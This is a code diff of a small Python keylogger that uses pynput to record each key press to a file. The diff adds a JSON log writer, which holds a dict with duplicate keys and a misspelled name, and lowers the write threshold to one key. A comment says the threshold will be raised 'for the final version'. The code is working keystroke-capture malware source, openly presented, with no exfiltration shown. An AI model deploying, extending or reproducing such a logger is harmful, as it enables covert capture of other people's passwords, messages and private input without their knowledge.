@@ -1,17 +1,26 @@
 import pynput
 from pynput.keyboard import Key, Listener
 from datetime import datetime
+import json
 
-count, keys = 0, []
+count, keys, fianl_log = 0, [], {'date': 'keys go here', 'date': 'did it work?', 'date': 'is it just doing the last one?'}
 
 def on_press(key):
 	global keys, count
 	keys.append(key)
 	count += 1
 	
-	if count >= 10:
+	if count >= 1: #change to a bigger number for the final version
 		write_file(keys)
+		write_log(fianl_log)
 		count, keys = 0, []
+
+
+
+def write_log(fianl_log):
+	with open("tester.json", "w") as jf: 
+		json.dump(fianl_log, jf) 
+
 
 
 def write_file(keys):
@@ -23,9 +32,8 @@ def write_file(keys):
 			elif k.find('Key') == -1:
 				f.write(k)
 			else:
-				f.write(' '+k[4:])
+				f.write(' '+k[4:]+' ')
 
-    
 
 def on_release(key):
 	if key == Key.esc:
